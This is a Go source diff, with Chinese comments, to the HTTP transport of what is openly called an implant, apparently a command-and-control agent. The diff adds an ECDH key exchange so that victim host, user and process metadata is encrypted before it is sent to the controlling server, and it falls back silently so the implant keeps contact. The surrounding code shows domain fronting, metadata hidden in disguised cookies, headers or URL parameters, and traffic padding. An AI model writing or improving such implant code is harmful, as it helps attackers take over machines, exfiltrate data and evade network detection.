@@ -3,24 +3,20 @@
 package main
 
 import (
+	"encoding/json"
+	"fmt"
 	"implant/core/app"
 	"implant/core/communication"
 	"implant/core/config"
 	"implant/core/encrypt"
 	"implant/core/reconnect"
 	"implant/core/utils"
-	"encoding/json"
-	"fmt"
 	"io"
 	"math/rand"
 	"net/http"
 	"strings"
 	"time"
 )
-
-
-
-
 
 // NewTransport 构造 http 传输（单二进制 build tag 入口）
 // init 注册到运行时传输表（多传输构建下按 scheme 选择；单传输构建下只有自己）
@@ -40,6 +36,9 @@ func (s *HTTPClient) IsConnected() bool { return s.connected }
 func (s *HTTPClient) ReconnectMgr() *reconnect.ReconnectManager { return s.reconnectMgr }
 
 type HTTPClient struct {
+	// kxPub 会话前 ECDH 交换得到的临时公钥（base64）；空表示未交换
+	kxPub string
+
 	reconnectMgr *reconnect.ReconnectManager
 	connected    bool
 	getURL       string
@@ -75,6 +74,13 @@ func (s *HTTPClient) Connect(host string) error {
 		s.reconnectMgr.OnReconnectAttempt()
 	}
 	s.setURLs(host)
+
+	// 会话前 ECDH 交换（必须在生成 MetaInfo **之前**）。
+	// MetaInfo 里是主机名/用户名/进程等敏感信息；若先加密再交换，
+	// 首包仍会被静态密钥解开，改造就只剩表面效果。
+	// 交换失败时 s.kxPub 为空，后续走静态密钥（老行为），不会失联。
+	s.kxHandshake()
+
 	if len(utils.MetaInfo) == 0 {
 		metaRaw, metaErr := utils.EncryptedMetaInfo()
 		if metaErr != nil {
@@ -125,7 +131,9 @@ func applyFrontHost(req *http.Request) {
 }
 
 // applyMetadata 将 metadata（MetaInfo）放入随机/配置的传输通道：
-//   cookie（默认）/ header（X-IG-App-ID 伪装头）/ url（?sessionid= 参数）/ auto（每请求随机）。
+//
+//	cookie（默认）/ header（X-IG-App-ID 伪装头）/ url（?sessionid= 参数）/ auto（每请求随机）。
+//
 // 服务端从三通道统一提取后裁 prepend 还原。
 func (s *HTTPClient) applyMetadata(req *http.Request) {
 	channel := config.MetadataChannel()
@@ -159,15 +167,80 @@ func (s *HTTPClient) applyRequestPadding(req *http.Request) {
 	req.Header.Set("X-Client-Data", string(pad))
 }
 
+// kxPub 本次会话的临时公钥（base64）。非空表示握手成功，后续请求要带着它，
+// 服务端据此命中缓存里同一份派生主密钥。
+//
+// 只在 Connect 期间使用：FirstBlood 完成后服务端已按 uid 注册会话密钥，
+// 之后再带这个头没有意义（也会让每个请求多一个可变字段）。
+
+// applyKxHeader 把临时公钥放进请求头（握手后的请求都带，直到 FirstBlood 完成）
+func (s *HTTPClient) applyKxHeader(req *http.Request) {
+	if s.kxPub != "" {
+		req.Header.Set(encrypt.KxHeaderName, s.kxPub)
+	}
+}
+
+// kxHandshake 会话前密钥交换：发一个只带公钥的 GET，从响应头取服务端公钥，
+// 派生主密钥并替换掉编译期静态主密钥。
+//
+// 失败语义：**不返回错误**，只清空 s.kxPub 并继续。理由 ——
+// 交换失败应与"服务端不支持 ECDH"表现一致（走静态密钥），
+// 而不是让整条传输起不来。是否强制 ECDH 由部署侧的 ecdh_mode 决定（后续阶段）。
+func (s *HTTPClient) kxHandshake() {
+	s.kxPub = ""
+	kx, err := encrypt.NewKeyExchange()
+	if err != nil {
+		return
+	}
+	req, err := http.NewRequest("GET", s.getURL, nil)
+	if err != nil {
+		return
+	}
+	req.Header.Set("User-Agent", config.UserAgent())
+	req.Header.Set(encrypt.KxHeaderName, kx.HeaderValue())
+	applyFrontHost(req)
+	s.applyRequestPadding(req)
+
+	resp, err := s.client.Do(req)
+	if err != nil {
+		return
+	}
+	defer resp.Body.Close()
+	io.Copy(io.Discard, resp.Body)
+	if resp.StatusCode != http.StatusOK {
+		return
+	}
+
+	peerPub, err := encrypt.ParsePeerPublicKey(resp.Header.Get(encrypt.KxHeaderName))
+	if err != nil {
+		return // 服务端没回公钥：不支持 ECDH，继续用静态密钥
+	}
+
+	salt, _ := app.GetListenerKeyConfig("http")
+	masterKey, err := kx.DeriveMasterKey(peerPub, salt[:16])
+	if err != nil {
+		return
+	}
+	if err := encrypt.GlobalClientKeyManager.ReplaceMasterKey(masterKey); err != nil {
+		return
+	}
+	s.kxPub = kx.HeaderValue()
+	// 主密钥换了，之前缓存的 MetaInfo（用静态密钥生成）必须作废重建
+	utils.MetaInfo = nil
+}
+
 // getRaw 发起一次 GET，仅用于 FirstBlood 探测（检查 200）。
 func (s *HTTPClient) getRaw() error {
 	req, err := http.NewRequest("GET", s.getURL, nil)
-	req.Header.Set("User-Agent", config.UserAgent())
-if err != nil {
+	// 原实现把 err 检查写在 req.Header.Set 之后：NewRequest 失败时 req 为 nil，
+	// 会先解引用 panic 而不是返回错误。
+	if err != nil {
 		return err
 	}
+	req.Header.Set("User-Agent", config.UserAgent())
 	applyFrontHost(req)
 	s.applyMetadata(req)
+	s.applyKxHeader(req)
 	s.applyRequestPadding(req)
 	resp, err := s.client.Do(req)
 	if err != nil {
@@ -185,7 +258,7 @@ if err != nil {
 func (s *HTTPClient) Recv() ([]byte, error) {
 	req, err := http.NewRequest("GET", s.getURL, nil)
 	req.Header.Set("User-Agent", config.UserAgent())
-if err != nil {
+	if err != nil {
 		return nil, err
 	}
 	applyFrontHost(req)
@@ -238,7 +311,7 @@ if err != nil {
 func (s *HTTPClient) SendResult(b64Packet []byte) error {
 	req, err := http.NewRequest("POST", s.postURL, strings.NewReader(string(b64Packet)))
 	req.Header.Set("User-Agent", config.UserAgent())
-if err != nil {
+	if err != nil {
 		return err
 	}
 	applyFrontHost(req)
